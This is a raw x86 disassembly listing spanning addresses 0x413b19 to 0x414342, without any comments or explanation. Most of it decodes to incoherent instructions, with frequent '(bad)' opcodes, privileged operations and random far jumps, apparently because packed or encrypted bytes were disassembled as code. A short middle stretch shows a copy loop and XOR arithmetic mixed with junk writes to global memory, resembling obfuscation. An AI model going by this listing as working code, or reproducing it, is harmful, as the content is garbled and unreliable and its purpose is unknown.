  413b19:	and    DWORD PTR [ecx],0x20
  413b1c:	adc    BYTE PTR [esi+0x61],0x2a
  413b20:	push   0x74
  413b22:	sub    ch,BYTE PTR [eax+0x18]
  413b25:	sbb    BYTE PTR [ecx],dh
  413b27:	call   0xeea6:0xa0c9b618
  413b2e:	fcom   DWORD PTR [ecx-0x5b20ed5f]
  413b34:	inc    edi
  413b35:	sar    DWORD PTR [ecx+0x46],0x37
  413b39:	and    al,0x78
  413b3b:	test   eax,0xe88070ce
  413b40:	rol    BYTE PTR [ebx],cl
  413b42:	mov    ds:0x7f383656,eax
  413b47:	imul   edi,DWORD PTR [edi+edi*2-0x2550dea2],0xffffffcf
  413b4f:	int3   
  413b50:	and    DWORD PTR [ebx-0x12],esp
  413b53:	fst    QWORD PTR [esi-0x39768b33]
  413b59:	cmp    DWORD PTR [ebx+0x17fcf5f0],eax
  413b5f:	jle    0x413b69
  413b61:	sbb    cl,0x78
  413b64:	mov    eax,ds:0x87ea15f7
  413b69:	aas    
  413b6a:	mov    DWORD PTR [edi-0x57],edi
  413b6d:	xchg   esp,eax
  413b6e:	mov    ebp,DWORD PTR [edx-0x7710091d]
  413b74:	jnp    0x413b3c
  413b76:	or     al,BYTE PTR [ebp+0x1a]
  413b79:	push   eax
  413b7a:	popa   
  413b7b:	(bad)  
  413b7c:	jmp    0x4662:0x5a6be7ee
  413b83:	inc    esp
  413b84:	mov    dh,0xed
  413b86:	sahf   
  413b87:	add    BYTE PTR [edx-0x26],bh
  413b8a:	out    0x90,al
  413b8c:	mov    eax,ds:0x58085094
  413b91:	popa   
  413b92:	push   0xe0868a09
  413b97:	(bad)  
  413b98:	xchg   ecx,eax
  413b99:	iret   
  413b9a:	das    
  413b9b:	inc    ecx
  413b9c:	scas   eax,DWORD PTR es:[edi]
  413b9d:	jmp    0xd92965b
  413ba2:	jp     0x413beb
  413ba4:	sub    DWORD PTR [edx+0x118fbbb5],edx
  413baa:	fild   QWORD PTR [esi]
  413bac:	rcr    BYTE PTR [eax-0x155800c2],0x2a
  413bb3:	jnp    0x413b4e
  413bb5:	sar    ch,cl
  413bb7:	cmp    al,0x2c
  413bb9:	mov    ds:0xf88e7f6a,al
  413bbe:	cwde   
  413bbf:	jno    0x413bab
  413bc1:	mov    BYTE PTR [ebp-0x1b],ah
  413bc4:	popa   
  413bc5:	or     eax,0x31859992
  413bca:	fcmovb st,st(1)
  413bcc:	out    dx,al
  413bcd:	(bad)  
  413bce:	jg     0x413bf2
  413bd0:	gs and al,0xbb
  413bd3:	lods   al,BYTE PTR ds:[esi]
  413bd4:	jl     0x413bef
  413bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bd7:	scas   al,BYTE PTR es:[edi]
  413bd8:	add    al,0xac
  413bda:	jo     0x413bfc
  413bdc:	or     cl,BYTE PTR [eax-0x16788e55]
  413be2:	popa   
  413be3:	add    edx,DWORD PTR [ebp-0x42]
  413be6:	(bad)  
  413be7:	cld    
  413be8:	(bad)
  413bec:	inc    ecx
  413bed:	mov    ds:0x3b0b3efd,eax
  413bf2:	rcr    BYTE PTR [edx],0xcd
  413bf5:	sahf   
  413bf6:	push   edx
  413bf7:	mov    esp,0x56ecd302
  413bfc:	add    edi,DWORD PTR ds:0xce6185e8
  413c02:	mov    ah,0x8c
  413c04:	dec    eax
  413c05:	and    ebx,DWORD PTR [ecx-0x38]
  413c08:	mov    ah,0xd8
  413c0a:	push   ds
  413c0b:	gs out dx,eax
  413c0d:	(bad)  
  413c0e:	arpl   WORD PTR [ebp+edi*8-0x97cf23b],bx
  413c15:	adc    al,0x49
  413c17:	outs   dx,BYTE PTR ds:[esi]
  413c18:	add    BYTE PTR [edx+0x212aa07a],bh
  413c1e:	push   esi
  413c1f:	addr16 imul ecx,edi,0xffffff8a
  413c23:	pop    esp
  413c24:	pusha  
  413c25:	popf   
  413c26:	pop    ecx
  413c27:	cmc    
  413c28:	or     DWORD PTR [edx+0x3a7d7533],0xffffffb3
  413c2f:	push   0x4c
  413c31:	pushf  
  413c32:	leave  
  413c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c34:	fistp  QWORD PTR [ebp+0x76]
  413c37:	xchg   BYTE PTR [ecx-0x28],ah
  413c3a:	ds sbb al,0xcb
  413c3d:	adc    al,0x49
  413c3f:	fwait
  413c40:	or     BYTE PTR [ecx+0x77],al
  413c43:	ror    DWORD PTR [edi+edx*2-0x53c3d95c],1
  413c4a:	fsub   DWORD PTR [edx+edx*1-0x69]
  413c4e:	mov    al,0x71
  413c50:	pop    esp
  413c51:	inc    edi
  413c52:	rcl    BYTE PTR [ebx-0x1c32d6b5],cl
  413c58:	repz adc eax,0xfe69edf1
  413c5e:	bound  ebx,QWORD PTR [bp+si]
  413c61:	inc    esp
  413c62:	mov    bl,0x2b
  413c64:	das    
  413c65:	(bad)  
  413c66:	jecxz  0x413c25
  413c68:	clc    
  413c69:	into   
  413c6a:	aad    0xf7
  413c6c:	cmp    eax,0x4741bc64
  413c71:	adc    BYTE PTR [ebx-0x9],0x50
  413c75:	cli    
  413c76:	je     0x413c1b
  413c78:	stos   DWORD PTR es:[edi],eax
  413c79:	mov    ebx,cr2
  413c7c:	or     dh,BYTE PTR [ecx-0x2f]
  413c7f:	out    0xb8,al
  413c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c82:	arpl   WORD PTR [esi],si
  413c84:	push   ecx
  413c85:	push   es
  413c86:	dec    edi
  413c87:	push   ebx
  413c88:	shl    DWORD PTR [ebx],1
  413c8a:	popf   
  413c8b:	pop    eax
  413c8c:	cmp    al,0xc3
  413c8e:	into   
  413c8f:	xrelease mov BYTE PTR [di],al
  413c93:	cmp    ah,al
  413c95:	retf   0x115c
  413c98:	xchg   ebx,eax
  413c99:	(bad)  
  413c9a:	xchg   edx,eax
  413c9b:	add    DWORD PTR [eax],0x2d
  413c9e:	imul   edi,DWORD PTR [edx],0x90552e85
  413ca4:	sbb    DWORD PTR [eax+0x6f],edi
  413ca7:	into   
  413ca8:	int    0x8f
  413caa:	pop    ebp
  413cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cac:	add    al,BYTE PTR ds:0x6675d667
  413cb2:	fnstcw WORD PTR es:[edi+esi*4-0x32145305]
  413cba:	xchg   ebp,eax
  413cbb:	sbb    ch,BYTE PTR [eax]
  413cbd:	adc    DWORD PTR [eax-0x66],ecx
  413cc0:	ja     0x413c4c
  413cc2:	xlat   BYTE PTR ds:[ebx]
  413cc3:	push   edi
  413cc4:	sbb    al,0x3b
  413cc6:	add    edi,DWORD PTR [edi]
  413cc8:	imul   DWORD PTR [ecx-0x5a74066]
  413cce:	push   esp
  413ccf:	jp     0x413d43
  413cd1:	fdiv   DWORD PTR [ebp+0xa]
  413cd4:	jp     0x413ccb
  413cd6:	mov    cs,WORD PTR [eax-0x46]
  413cd9:	test   BYTE PTR [ecx-0x14],dh
  413cdc:	stos   BYTE PTR es:[edi],al
  413cdd:	imul   esp,DWORD PTR [edi],0x24
  413ce0:	ffree  st(5)
  413ce2:	icebp  
  413ce3:	mov    eax,ds:0x7464c80a
  413ce8:	add    DWORD PTR [ecx],esi
  413cea:	daa    
  413ceb:	ret    0x6e93
  413cee:	sbb    al,0xc5
  413cf0:	or     eax,0xdf5c458b
  413cf5:	adc    DWORD PTR [edx],edi
  413cf7:	pop    edi
  413cf8:	pop    edx
  413cf9:	sub    bh,BYTE PTR [ebp-0x6]
  413cfc:	xor    al,BYTE PTR [edi+0x15]
  413cff:	test   DWORD PTR [edx-0x51],ecx
  413d02:	cwde   
  413d03:	pop    edi
  413d04:	dec    ebx
  413d05:	lahf   
  413d06:	imul   esp,ebp,0xf9d2f9c5
  413d0c:	(bad)  
  413d0e:	jp     0x413cb1
  413d10:	jae    0x413d69
  413d12:	mov    ch,0x70
  413d14:	add    ebx,edi
  413d16:	xlat   BYTE PTR ds:[ebx]
  413d17:	jmp    0x3b7c:0xa57449b
  413d1e:	dec    esi
  413d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d20:	daa    
  413d21:	int3   
  413d22:	inc    esi
  413d23:	fcom   DWORD PTR [ecx+0x64]
  413d26:	repnz mov bl,0x17
  413d29:	jmp    0xd6a0bd83
  413d2e:	rol    DWORD PTR [eax],1
  413d30:	adc    bl,BYTE PTR [esi]
  413d32:	jp     0x413d55
  413d34:	or     esp,DWORD PTR [ecx]
  413d36:	test   BYTE PTR [ebx-0x1b],dl
  413d39:	push   ebp
  413d3a:	mov    db4,eax
  413d3d:	xlat   BYTE PTR fs:[ebx]
  413d3f:	aad    0x26
  413d41:	adc    BYTE PTR [eax+edx*2+0x11],cl
  413d45:	sbb    al,0x3c
  413d47:	(bad)  
  413d48:	xchg   edx,eax
  413d49:	(bad)  
  413d4a:	stos   DWORD PTR es:[edi],eax
  413d4b:	mov    ebp,0xb6ac4140
  413d50:	mov    WORD PTR [esi+0x5f74214f],es
  413d56:	nop
  413d57:	mov    al,0xb
  413d59:	xchg   edi,eax
  413d5a:	lods   al,BYTE PTR ds:[esi]
  413d5b:	fisub  WORD PTR [edi+ecx*1-0x742a6c9f]
  413d62:	sbb    eax,0x64fc63c3
  413d67:	rcl    BYTE PTR [ebx+esi*4],1
  413d6a:	(bad)  
  413d6b:	mov    edx,0x8fa4c7ed
  413d70:	ret    
  413d71:	jl     0x413cf7
  413d73:	rcl    DWORD PTR [ebx],1
  413d75:	test   cl,0x1f
  413d78:	cmp    al,0xa8
  413d7a:	or     eax,0x999a580b
  413d7f:	pop    esp
  413d80:	mov    ebx,0x548eb45
  413d85:	cli    
  413d86:	or     edx,eax
  413d88:	out    0x68,eax
  413d8a:	unpckhps xmm1,xmm1
  413d8d:	cmc    
  413d8e:	repnz or eax,0x26a5d5b5
  413d94:	je     0x413df4
  413d96:	fimul  WORD PTR [esi]
  413d98:	sbb    eax,0x41ea2b53
  413d9d:	test   eax,0x9b8f0790
  413da2:	pop    ds
  413da3:	repnz lock xchg edi,eax
  413da6:	or     DWORD PTR [ecx-0x7b],edi
  413da9:	lods   eax,DWORD PTR ds:[esi]
  413daa:	std    
  413dab:	or     BYTE PTR [edi+0x6bfdb51],0xc7
  413db2:	(bad)  [esp+eiz*8]
  413db5:	pop    esi
  413db6:	inc    ebp
  413db7:	fwait
  413db8:	aad    0x87
  413dba:	(bad)  
  413dbd:	lds    esi,FWORD PTR [edi+0x37]
  413dc0:	outs   dx,DWORD PTR ds:[esi]
  413dc1:	ins    DWORD PTR es:[edi],dx
  413dc2:	(bad)  
  413dc3:	rcl    BYTE PTR [ebp-0x62],1
  413dc6:	mov    edi,DWORD PTR [ebx+ecx*2+0x442873ca]
  413dcd:	inc    esi
  413dce:	sbb    eax,0x23563373
  413dd3:	lods   eax,DWORD PTR ds:[esi]
  413dd4:	ins    BYTE PTR es:[edi],dx
  413dd5:	inc    eax
  413dd6:	sar    DWORD PTR [edx-0x6191bb20],0x79
  413ddd:	sub    esp,DWORD PTR [ecx]
  413ddf:	xchg   esp,eax
  413de0:	imul   esp,DWORD PTR [esi],0x5c
  413de3:	fdiv   QWORD PTR [ebp-0x6b]
  413de6:	xchg   BYTE PTR [ecx-0x5c],bl
  413de9:	cmp    eax,0xa8ca8643
  413dee:	popa   
  413def:	inc    eax
  413df0:	jbe    0x413df2
  413df2:	in     eax,dx
  413df3:	adc    edx,DWORD PTR [ebx+0x4b]
  413df6:	mov    edi,0x7026394d
  413dfb:	scas   al,BYTE PTR es:[edi]
  413dfc:	in     al,dx
  413dfd:	scas   eax,DWORD PTR es:[edi]
  413dfe:	mov    ah,0xd
  413e00:	fsub   st(2),st
  413e02:	mov    edx,0x27608fbf
  413e07:	xchg   BYTE PTR [eax],cl
  413e09:	bnd jnp 0x413e88
  413e0c:	leave  
  413e0d:	in     eax,0x5
  413e0f:	int3   
  413e10:	push   cs
  413e11:	test   al,0xf9
  413e13:	and    ah,BYTE PTR [ebx]
  413e15:	imul   DWORD PTR [ebx-0x47]
  413e18:	adc    cl,BYTE PTR [ecx-0x7202ea21]
  413e1e:	dec    esp
  413e1f:	jne    0x413df9
  413e21:	test   eax,0xfaad7466
  413e26:	jb     0x413e9b
  413e28:	push   ebx
  413e29:	ss push esi
  413e2b:	test   DWORD PTR ds:0xc0a49139,esp
  413e31:	and    DWORD PTR [esi+0x20829de8],edi
  413e37:	mov    ds:0x4235e14d,al
  413e3c:	rol    ch,cl
  413e3e:	jne    0x413e82
  413e40:	push   edi
  413e41:	and    BYTE PTR [ebp+0x3c31a754],bl
  413e47:	ret    0xaa7f
  413e4a:	mov    WORD PTR [edx+0x4d],?
  413e4d:	(bad)  
  413e4e:	rcl    DWORD PTR [ecx+0x8],cl
  413e51:	cs test eax,0x89c28ece
  413e57:	push   ss
  413e58:	mov    bl,0xc2
  413e5a:	aas    
  413e5b:	arpl   WORD PTR [di+0x3176],cx
  413e60:	dec    edi
  413e61:	into   
  413e62:	out    dx,eax
  413e63:	arpl   cx,bx
  413e65:	xchg   esp,eax
  413e66:	fist   WORD PTR [eax-0x2244cba7]
  413e6c:	das    
  413e6d:	popf   
  413e6e:	wrmsr  
  413e70:	jmp    0xb32d:0x2e7ca0ff
  413e77:	mov    DWORD PTR [edx+0x7c],esi
  413e7a:	addr16 or eax,0xf5283bb5
  413e80:	into   
  413e81:	pop    esp
  413e82:	push   esp
  413e83:	in     al,dx
  413e84:	push   edi
  413e85:	(bad)  
  413e86:	xchg   ebp,eax
  413e87:	int3   
  413e88:	test   DWORD PTR [esi],edx
  413e8a:	inc    ebp
  413e8b:	jns    0x413e33
  413e8d:	call   0x628207fa
  413e92:	icebp  
  413e93:	and    BYTE PTR [ebx+0x788eb583],cl
  413e99:	test   DWORD PTR [ebx],0x7de958a6
  413e9f:	pop    ds
  413ea0:	loopne 0x413f19
  413ea2:	and    DWORD PTR [ecx+0x14e0dc6c],edi
  413ea8:	adc    dl,BYTE PTR [eax]
  413eaa:	and    DWORD PTR [eax+0x61856d83],esi
  413eb0:	inc    ecx
  413eb1:	xchg   DWORD PTR [ebp+0x32],ebx
  413eb4:	xchg   edx,eax
  413eb5:	pop    ds
  413eb6:	int    0xe8
  413eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eba:	mov    dl,0xdc
  413ebc:	xchg   BYTE PTR [esi],bl
  413ebe:	dec    DWORD PTR [edx-0xc07d452]
  413ec4:	dec    edx
  413ec5:	(bad)  
  413ec6:	push   esi
  413ec7:	pushf  
  413ec8:	mov    ds:0x12bc20ce,eax
  413ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ece:	and    dl,BYTE PTR [ecx+0x1307f6d5]
  413ed4:	loop   0x413e79
  413ed6:	or     BYTE PTR [esi+0x2e],bl
  413ed9:	push   eax
  413eda:	fwait
  413edb:	sbb    DWORD PTR [ebx-0x6d9b710e],ebx
  413ee1:	xor    cl,ch
  413ee3:	les    edx,FWORD PTR [ecx+0x57]
  413ee6:	in     eax,dx
  413ee7:	lea    eax,[ecx]
  413ee9:	sbb    bh,BYTE PTR [eax+0x7332d91f]
  413eef:	jae    0x413ec0
  413ef1:	mov    WORD PTR [edx+edx*8-0x179a4213],gs
  413ef8:	jg     0x413f0e
  413efa:	sti    
  413efb:	in     al,dx
  413efc:	in     al,0x87
  413efe:	push   eax
  413eff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f00:	dec    ecx
  413f01:	mov    ebp,0x64270883
  413f06:	mov    al,ds:0x712246d2
  413f0b:	sub    eax,0x8cb6f7f7
  413f10:	gs ret 
  413f12:	(bad)  
  413f13:	repnz mov eax,ds:0x39f0f6c6
  413f19:	mov    edx,0xf5c50adb
  413f1e:	es mov dl,0xca
  413f21:	test   eax,0x75534ec5
  413f26:	and    eax,0xc2356c4a
  413f2b:	mov    edi,0x35ac296a
  413f30:	cmp    DWORD PTR [ebp+0x3d7a6970],0xffffff94
  413f37:	pop    ecx
  413f38:	and    BYTE PTR [ebx],ch
  413f3a:	(bad)  
  413f3d:	lea    eax,[esi]
  413f3f:	repz sub ebp,DWORD PTR [ebx]
  413f42:	sub    bh,BYTE PTR [esi]
  413f44:	mov    al,ds:0x6efbb531
  413f49:	add    al,0x7f
  413f4b:	pop    ss
  413f4c:	jno    0x413fbd
  413f4e:	push   ecx
  413f4f:	xor    DWORD PTR [ecx-0x1e2a6408],edx
  413f55:	and    eax,0xe67b0ed6
  413f5a:	ins    BYTE PTR es:[edi],dx
  413f5b:	mov    al,ds:0x825d134
  413f60:	pop    edi
  413f61:	(bad)  
  413f62:	aad    0x38
  413f64:	sbb    DWORD PTR [edx-0x14c644b],edx
  413f6a:	mov    ds:0x11375252,al
  413f6f:	call   0x4c88c922
  413f74:	jmp    0xf9cb:0x1d9861da
  413f7b:	cli    
  413f7c:	(bad)  
  413f7d:	jae    0x413f9a
  413f7f:	addr16 inc esp
  413f81:	mov    ebp,0x96f6356d
  413f86:	cmc    
  413f87:	adc    DWORD PTR [eax],esp
  413f89:	jmp    0x413f2f
  413f8b:	rol    DWORD PTR [edx],cl
  413f8d:	out    0x4c,eax
  413f8f:	imul   ebx,ebp,0xffffffd8
  413f92:	xchg   ebp,eax
  413f93:	fild   DWORD PTR [edi]
  413f95:	cmp    esp,ebx
  413f97:	popf   
  413f98:	lea    edx,[esi+0x52ad56b1]
  413f9e:	adc    al,BYTE PTR [edi-0x1f2f8e02]
  413fa4:	push   ss
  413fa5:	in     al,0x8d
  413fa7:	dec    ebx
  413fa8:	cwde   
  413fa9:	dec    edi
  413faa:	add    eax,0xd841258c
  413faf:	or     ebx,esi
  413fb1:	std    
  413fb2:	sbb    ebp,ebx
  413fb4:	xchg   edi,eax
  413fb5:	xchg   esp,eax
  413fb6:	loopne 0x413fdd
  413fb8:	pop    ebx
  413fb9:	push   ds
  413fba:	inc    edi
  413fbb:	mov    ebp,0x94a26ac7
  413fc0:	inc    eax
  413fc1:	mov    esp,0xbcf928e3
  413fc6:	fist   DWORD PTR [esp+eiz*4-0x23044692]
  413fcd:	ins    BYTE PTR es:[edi],dx
  413fce:	mov    ch,0x1
  413fd0:	jo     0x413f7e
  413fd2:	adc    ecx,ebx
  413fd4:	(bad)  
  413fd5:	mov    dl,0x37
  413fd7:	inc    esp
  413fd8:	enter  0xefaf,0x32
  413fdc:	ss retf 0xa0b2
  413fe0:	mov    eax,0x23ae8540
  413fe5:	out    dx,eax
  413fe6:	sub    esi,DWORD PTR [esp+ebp*1-0x1938181a]
  413fed:	(bad)  
  413fee:	pop    ebp
  413fef:	push   edx
  413ff0:	shrd   DWORD PTR [edx-0x42c8c4a2],edi,cl
  413ff7:	add    esp,edx
  413ff9:	imul   edx,DWORD PTR ds:0xc79c2bb,0x4f
  414000:	dec    ecx
  414001:	iret   
  414002:	mov    bl,cl
  414004:	push   0x6bb61acf
  414009:	and    eax,0x22ba598c
  41400e:	cld    
  41400f:	mov    ds:0x91b972a5,eax
  414014:	aas    
  414015:	mov    bx,0xcbf8
  414019:	fimul  DWORD PTR [edx+0x1b2711b2]
  41401f:	adc    BYTE PTR [bx+si+0x60],0xe3
  414024:	rol    DWORD PTR [eax],cl
  414026:	jnp    0x414002
  414028:	scas   al,BYTE PTR es:[edi]
  414029:	or     ah,BYTE PTR [edx]
  41402b:	mov    esp,edi
  41402d:	lds    ebp,FWORD PTR [ecx]
  41402f:	mov    ecx,0xdff6f90c
  414034:	xchg   edi,eax
  414035:	mov    ebx,0xb44ad59d
  41403a:	mov    ebp,0xe29f3706
  41403f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414040:	call   DWORD PTR [ebp+0x1c401e2]
  414046:	pop    es
  414047:	cld    
  414048:	mov    BYTE PTR [esi-0x72],ch
  41404b:	cmp    DWORD PTR [ebx+0x3b],edx
  41404e:	shr    DWORD PTR [esi+edi*8+0x47],1
  414052:	or     DWORD PTR [edi-0x249c50f5],eax
  414058:	(bad)  
  414059:	mov    ecx,0xe2c8f56
  41405e:	mov    ebp,0xaf72b430
  414063:	enter  0x83e6,0xff
  414067:	mov    edi,0xe9d4e90c
  41406c:	fnstsw WORD PTR [eax]
  41406e:	lds    eax,FWORD PTR [edx]
  414070:	pop    edx
  414071:	mov    esp,0x8511afd4
  414076:	fnsave [ebx-0x4a]
  414079:	pop    ecx
  41407a:	dec    edx
  41407b:	sbb    al,0xed
  41407d:	or     eax,0x93c5668c
  414082:	in     eax,dx
  414083:	pop    edx
  414084:	ret    0x5fa8
  414087:	xor    ch,ch
  414089:	xor    al,ch
  41408b:	cld    
  41408c:	test   esi,edi
  41408e:	clc    
  41408f:	add    dl,bh
  414091:	lods   eax,DWORD PTR ds:[esi]
  414092:	(bad)  
  414093:	daa    
  414094:	test   al,0xce
  414096:	mov    eax,ds:0xace354c5
  41409b:	leave  
  41409c:	popf   
  41409d:	imul   ebp,DWORD PTR [eax],0xb96d2b3c
  4140a3:	ins    DWORD PTR es:[edi],dx
  4140a4:	sbb    dh,ch
  4140a6:	aam    0x3e
  4140a8:	retf   
  4140a9:	pop    ebx
  4140aa:	inc    edi
  4140ab:	std    
  4140ac:	(bad)  
  4140ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ae:	ins    BYTE PTR es:[edi],dx
  4140af:	xor    edi,eax
  4140b1:	mov    bh,0x23
  4140b3:	sub    esp,DWORD PTR [edi+eax*2]
  4140b6:	cmp    eax,0x6ee2df6
  4140bb:	arpl   WORD PTR [ecx],ax
  4140bd:	lods   eax,DWORD PTR ds:[esi]
  4140be:	pop    edi
  4140bf:	ins    BYTE PTR es:[edi],dx
  4140c0:	or     al,0x24
  4140c2:	add    bl,dh
  4140c4:	sub    ebx,DWORD PTR [esi-0xfac226f]
  4140ca:	push   esi
  4140cb:	daa    
  4140cc:	mov    edi,0x61fe1a18
  4140d1:	(bad)  
  4140d2:	loopne 0x41412a
  4140d4:	mov    eax,0x75108af
  4140d9:	and    DWORD PTR ds:0x432e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x432e4b,0x432e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x432e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x432e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x432e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x432e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x432ecf,0x432ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x432eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x432ea7,0x432e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x432e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1-0x1c95c7a7],dl
  41419c:	fwait
  41419d:	shl    DWORD PTR [ebp-0x6b],0x68
  4141a1:	add    BYTE PTR [ebx-0x7c7c9f19],0x4e
  4141a8:	push   0x8ea502fb
  4141ad:	ja     0x4141cc
  4141af:	push   cs
  4141b0:	mov    DWORD PTR [esi-0x29],ebx
  4141b3:	gs (bad) 
  4141b5:	mov    ah,0x9b
  4141b7:	fimul  WORD PTR [edx+0x3a]
  4141ba:	rol    BYTE PTR [ebx+eiz*4-0x47682a4b],1
  4141c1:	fmul   DWORD PTR [ebx+edx*4]
  4141c4:	sbb    al,0x29
  4141c6:	enter  0x7415,0xf3
  4141ca:	xchg   edx,eax
  4141cb:	dec    edi
  4141cc:	and    BYTE PTR [ebx+0xf64c2f0],cl
  4141d2:	sub    edx,ebp
  4141d4:	mov    dl,0x58
  4141d6:	adc    bh,BYTE PTR [eax+0x372861c7]
  4141dc:	aad    0x10
  4141de:	xor    ebx,DWORD PTR [ebx-0x40]
  4141e1:	test   eax,0x8429c358
  4141e6:	inc    edx
  4141e7:	cwde   
  4141e8:	pop    ebx
  4141e9:	rol    BYTE PTR [edi-0x1a],0x77
  4141ed:	pop    ebx
  4141ee:	lahf   
  4141ef:	jno    0x414259
  4141f1:	jg     0x4141b3
  4141f3:	jg     0x41419f
  4141f5:	push   esp
  4141f6:	inc    esi
  4141f7:	mov    ah,0x9b
  4141f9:	shr    BYTE PTR [esi-0x17],1
  4141fc:	mov    bl,0x98
  4141fe:	inc    edx
  4141ff:	ret    
  414200:	push   es
  414201:	sar    BYTE PTR [ebp-0x53f03e1c],0x9d
  414208:	les    ebp,FWORD PTR [ebx]
  41420a:	add    bh,BYTE PTR [ecx-0x529c6810]
  414210:	inc    ecx
  414211:	ror    BYTE PTR [ebx+0x42],cl
  414214:	adc    eax,0xea049251
  414219:	mov    ds:0x74df5984,eax
  41421e:	adc    DWORD PTR [esi+0x181b6132],ecx
  414224:	imul   esi,edx,0xeea82a67
  41422a:	push   ds
  41422b:	aaa    
  41422c:	dec    edi
  41422d:	je     0x41428f
  41422f:	push   eax
  414230:	and    BYTE PTR ds:0xfb5dc824,al
  414236:	and    ch,0xc5
  414239:	pop    es
  41423a:	loope  0x4141cd
  41423c:	stos   DWORD PTR es:[edi],eax
  41423d:	aad    0x46
  41423f:	xor    eax,0xe2018a41
  414244:	dec    ebx
  414245:	aaa    
  414246:	retf   
  414247:	sbb    DWORD PTR [edi],edi
  414249:	mov    ebp,0x2157b3c3
  41424e:	test   eax,0x2bdcfc42
  414253:	daa    
  414254:	stos   DWORD PTR es:[edi],eax
  414255:	std    
  414256:	pop    es
  414257:	mov    esi,0x613390b6
  41425c:	ror    bl,0x14
  41425f:	(bad)  
  414260:	sbb    al,0xa2
  414262:	xor    dl,BYTE PTR [eax+0x3c69f48b]
  414268:	inc    ecx
  414269:	cwde   
  41426a:	repz xchg ebx,eax
  41426c:	xor    BYTE PTR [ecx-0x1458e5d4],ch
  414272:	test   al,0x78
  414274:	shr    BYTE PTR [ebx],1
  414276:	cmp    eax,ebx
  414278:	jae    0x4142e7
  41427a:	lea    ebp,[edx]
  41427c:	and    eax,0x24057a55
  414281:	or     al,0x6d
  414283:	xor    DWORD PTR [ecx+ecx*2+0x10],ebx
  414287:	cmp    BYTE PTR [edi+0x41],ch
  41428a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428b:	dec    esp
  41428c:	mov    ebp,0xc7207070
  414291:	xor    bh,ch
  414293:	xchg   esp,eax
  414294:	test   DWORD PTR [ebx-0x31aa9c71],esp
  41429a:	add    eax,0x5ee181a3
  41429f:	(bad)  
  4142a0:	dec    ebx
  4142a1:	pop    ds
  4142a2:	pusha  
  4142a3:	dec    esi
  4142a4:	xchg   ebp,eax
  4142a5:	fst    DWORD PTR [edx+0x319e4114]
  4142ab:	xor    BYTE PTR [ebp-0x7f],0x81
  4142af:	dec    esi
  4142b0:	mov    ds:0xb781943c,al
  4142b5:	cli    
  4142b6:	lea    esp,[edi+0x227cec5c]
  4142bc:	(bad)  
  4142bd:	cmp    DWORD PTR [edx],edi
  4142bf:	adc    edi,0x1f
  4142c2:	icebp  
  4142c3:	mov    edi,0x76857139
  4142c8:	retf   
  4142c9:	popf   
  4142ca:	mov    edx,0xb78b822a
  4142cf:	sbb    eax,0x835041ec
  4142d4:	movntq QWORD PTR [ecx+ebp*4+0x4f6bc840],mm4
  4142dc:	xchg   ebx,eax
  4142dd:	div    DWORD PTR cs:[ebx+0x4a]
  4142e1:	jb     0x414280
  4142e3:	push   ds
  4142e4:	push   ebp
  4142e5:	mov    ds:0x88104818,eax
  4142ea:	xchg   edi,eax
  4142eb:	dec    esi
  4142ec:	hlt    
  4142ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142ee:	jg     0x4142e4
  4142f0:	fld    TBYTE PTR [eax+edx*8]
  4142f3:	jp     0x4142f6
  4142f5:	mov    edx,0x9d0ea29c
  4142fa:	jmp    0x66ef7889
  4142ff:	fld    DWORD PTR [esi-0x3cc34567]
  414305:	test   DWORD PTR [esi+edx*2-0xb56bbe0],edi
  41430c:	jg     0x4142c6
  41430e:	and    BYTE PTR [eax-0x721ce4dd],al
  414314:	dec    esp
  414315:	sbb    al,0x84
  414317:	mov    esp,0xf3a812bf
  41431c:	outs   dx,BYTE PTR ds:[esi]
  41431d:	jbe    0x414376
  41431f:	sbb    esp,esp
  414321:	cdq    
  414322:	add    edi,0xffffff9a
  414325:	rcr    BYTE PTR [ecx-0x4a],1
  414328:	das    
  414329:	inc    ebp
  41432a:	test   al,0xe6
  41432c:	fisub  DWORD PTR [edx-0x51]
  41432f:	sbb    ebp,DWORD PTR [ecx-0x71ee015c]
  414335:	icebp  
  414336:	or     al,0xbf
  414338:	mov    edi,0x4c9ee40d
  41433d:	test   BYTE PTR [ebx-0x4d],al
  414340:	into   
  414341:	clc    
  414342:	push   0xbc2fdbd5
